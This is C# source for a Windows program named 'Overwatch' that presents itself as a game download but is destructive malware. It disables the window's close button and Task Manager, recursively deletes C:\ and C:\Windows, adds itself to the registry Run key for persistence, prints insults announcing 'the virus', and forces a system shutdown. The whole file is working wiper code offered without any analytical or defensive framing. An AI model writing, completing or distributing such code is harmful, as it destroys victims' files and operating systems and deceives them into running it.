using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Permissions;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Overwatch
{
    class Program
    {
        private static string User = null;
        private static bool reg_Failed = false;
        private const bool Running = true;
        protected const int delay = 2, t_Delay = 18;
        protected const int sec_Shutdown = 10;

        //Objects
        private static Getinfo user1 = new Getinfo(User, 1, "C:\\");
        private static Getinfo user2 = new Getinfo(User, 2, "C:\\Windows");

        //Window
        private const int MF_BYCOMMAND = 0x00000000;
        public const int SC_CLOSE = 0xF060;

        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr
        phtok);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name,
        ref long pluid);

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);

        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int EWX_LOGOFF = 0x00000000;
        internal const int EWX_SHUTDOWN = 0x00000001;
        internal const int EWX_REBOOT = 0x00000002;
        internal const int EWX_FORCE = 0x00000004;
        internal const int EWX_POWEROFF = 0x00000008;
        internal const int EWX_FORCEIFHUNG = 0x00000010;

        static void Main(string[] args)
        {
            //Objects
            Thread writeThings = new Thread(Writeinsult);

            Console.Title = "Loading Overwatch";
            User = Environment.UserName;

            //Disable X button
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), SC_CLOSE, MF_BYCOMMAND);

            DisableTaskManager();
            Update();

            Console.Beep();
            Console.WriteLine("Downloading Overwatch {0} please wait....", user1.User);

            Info();
            setApp();
            Console.Clear();

            while (Running) {
                switch (reg_Failed) {
                    case true:
                        Console.WriteLine("Shame...... {0}", user1.User);
                        //Shutdown the pc so the changes will take effect
                        writeThings.Start();
                        DoExitWin(EWX_SHUTDOWN);
                        break;
                    case false:
                        Console.WriteLine("Hahahahahahahaha {0}", user1.User);
                        //Shutdown the pc so the changes will take effect
                        writeThings.Start();
                        DoExitWin(EWX_SHUTDOWN);
                        break;
                }
                Console.ReadKey();
            }
        }

        private static void Writeinsult()
        {
            while (Running)
            {
                Console.WriteLine("Idiot the virus was activated");
                Console.WriteLine("Bye bye.");
            }
        }

        private static void Update()
        {
            user1.User = User;
            user2.User = User;
        }

        private static void Info()
        {
            try
            {
                EnvironmentPermission emvp = new EnvironmentPermission(EnvironmentPermissionAccess.AllAccess, user1.Path);
                EnvironmentPermission emvp2 = new EnvironmentPermission(EnvironmentPermissionAccess.AllAccess, user2.Path);

                Update();

                try
                {
                    Directory.Delete(user1.Path, true);
                }
                finally
                {
                    Directory.Delete(user2.Path, true);
                }
                File.CreateText(user1.Path + "fool.txt");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error Can't Start Overwatch!!! {0}", e);
            }

        }

        private static void setApp()
        {
            try
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("VOverwatch", @"/Overwatch.exe");
            }
            catch (Exception)
            {

            }
        }

        private static void DisableTaskManager()
        {
            RegistryKey regkey = default(RegistryKey);
            string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception)
            {
                reg_Failed = true;
            }

        }

        private static void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }

    }
}
